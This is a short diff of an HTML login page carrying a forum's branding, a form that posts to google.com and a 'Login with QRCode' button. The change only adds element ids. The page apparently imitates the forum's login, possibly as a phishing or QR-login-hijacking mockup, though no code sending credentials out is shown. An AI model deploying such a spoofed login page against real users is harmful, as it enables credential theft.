@@ -17,17 +17,17 @@
 				<img src="https://digitalnomadsforum.com/styles/FLATBOOTS/theme/images/user4.png">
 			</div>
 			<form action="https://google.com" method="post" target="_blank">
-				<input name="username" type="text" placeholder="username" required>
+				<input id="user" name="username" type="text" placeholder="username" required>
 				<div class="bar">
           <i></i>
         </div>
-				<input name="password" type="password" placeholder="password" required>
-				<button type="submit" onclick="validate()">Login</button>
+				<input id="pass" name="password" type="password" placeholder="password" required>
+				<button id="btn" type="submit" onclick="validate()">Login</button>
 			</form>
 			<button type="submit" onclick="open_qr()">Login with QRCode</button>
 		</div>
 		<br>
-		
+
 		<script>
 		validate = function() {
 			if(document.getElementsByName('username')[0].value &&
